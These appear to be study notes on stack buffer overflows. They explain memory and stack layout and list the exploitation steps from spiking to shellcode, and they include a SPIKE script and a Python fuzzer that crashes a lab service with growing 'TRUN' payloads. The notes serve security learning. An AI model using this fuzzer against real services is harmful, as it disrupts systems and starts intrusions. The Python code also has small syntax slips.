#Bufferoverflow usually arises when we operate buffers on char type.

It consists of overflowing of stack memory or overflow of heap memory.

###### Anatomy of Memory:

[[Kernel]]          TOP    - 0xffff
___
==Stack==
___
[[Heap]]
___
Data 
___
Text           BOTTOM  - 0x0000

###### Anatomy of [[Stack]]:

ESP (Extended stack pointer) 
___
==Buffer Space== - *was the part of characters filled with buffer overflows*
___
EBP (Extended Base Pointer) 
___
EIP (Extended Instruction Pointer) / Return Address

**EBP** - used as a reference when accessing local variables and arguments of the function.
**ESP** - The stack pointer -- also referred to as the **extended stack pointer** (ESP) -- ensures that the program always adds data to the right location in the stack. The stack stores data from the top down, following a last in, first out (LIFO) data structure.

#References *# Running a Buffer Overflow Attack - Computerphile*
https://youtu.be/1S0aBV-Waeo 

###### Steps to conduct a Buffer overflow
* Spiking - vulnerable part of the program (parameter, variables)
* Fuzzing - sending bunch of characters to break the program.
* Finding the offset - An integer indicating the distance b/w beginning of the object and a given element or a point.
* Overwriting the EIP  - pointer address
* Finding Bad Characters - 
* Finding the right module
* Generating the shell code
* Root  

###### Spiking

Test with the commands whether the program is crashing or not. if it is crashing it is vuln to buffer overflow.

All kind of different character send to break the program is called spiking.

Attach the vulnerable exe file in the [[immunitydebugger]]

`generic_send_tcp`  is tool which uses the spike scripts to make the program crash.

```spk
s_readline();
s_string("STATS ");
s_string_variable("0");
```

###### Fuzzing 
```python
#!usr/bin/python
import sys,socket
from time import sleep

buffer="A"*100
while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
		#AF_INET = ipv4 && SOCK_STREAM = port
		s.connect(('192.168.23.2',9999))
		s.send(('TRUN /.:/'+buffer)) # /.:/ is a string literal that is being concatenated with the repeated character of A's
		s.close()
		sleep(1)
		buffer=buffer+"A"*100
	except:
		print("Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()
		
```